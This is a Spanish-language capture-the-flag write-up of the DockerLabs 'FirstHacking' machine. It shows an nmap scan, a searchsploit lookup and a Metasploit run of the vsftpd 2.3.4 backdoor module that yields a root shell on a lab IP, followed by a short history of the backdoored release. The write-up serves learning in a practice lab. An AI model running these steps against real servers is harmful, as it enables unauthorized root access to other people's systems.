---
title: FirstHacking
date: 2025-08-27 11:00:00 +0200
categories: [writeup, dockerlabs]
tags: [dockerlabs, hydra, ssh, fuerza bruta]     
image:
    path: https://dockerlabs.es/static/images/logos/logo.png
    alt: Docker Labs
---

# FirstHacking

>FirstHacking
Autor: El Pingüino de Mario
Dificultad: Muy Fácil
Fecha de creación: 14/06/2024
{: .prompt-tip }

⚠️Vunerabilidad Remote Code Execution

CVE: CVE-2011-2523

## 🔭 Reconocimiento: 

Comienzo con Nmap, que al fin y al cabo es donde empieza la diversión. 

```shell
nmap -p- 10.88.0.2 -sV -vv
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.3.4
MAC Address: 72:67:68:3C:12:BD (Unknown)
Service Info: OS: Unix
```

## 💣 Preparación:

Buscamos un "arma" para usar contra esta aplicación.

``` shell
└─$ searchsploit vsftpd 2.3.4
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                 | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                    | unix/remote/17491.rb
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Result
```

## 🚚 Distribución:

Lanzamos el payload contra nuestro objetivo con Metasploit

``` shell
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 10.88.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.88.0.2:21 - USER: 331 Please specify the password.
[+] 10.88.0.2:21 - Backdoor service has been spawned, handling...
[+] 10.88.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (10.88.0.1:42055 -> 10.88.0.2:6200) at 2025-09-08 01:06:11 +0200
whoami
root
```

## 🪲 Explotación:

 En julio de 2011, se descubrió que la versión 2.3.4 de vsftpd, descargable desde el sitio principal, había sido comprometida. 
Los usuarios que iniciaban sesión en un servidor vsftpd-2.3.4 comprometido podían usar una cara sonriente :)
como nombre de usuario y obtener acceso a una consola de comandos en el puerto 6200. 
Esto no se debía a una vulnerabilidad de seguridad en vsftpd, sino a que alguien había subido una versión diferente de vsftpd
que contenía una puerta trasera. Desde entonces, el sitio se migró a Google App Engine.

## 👽 Acciones: 
Permite al atacante ganar acceso completo a la máquina como root. Supongo que por eso se llama "firsthacking" "with Metasploit?"

Este write up ha sido realizado en gran parte con la herramienta [DarkReport](../darkreport)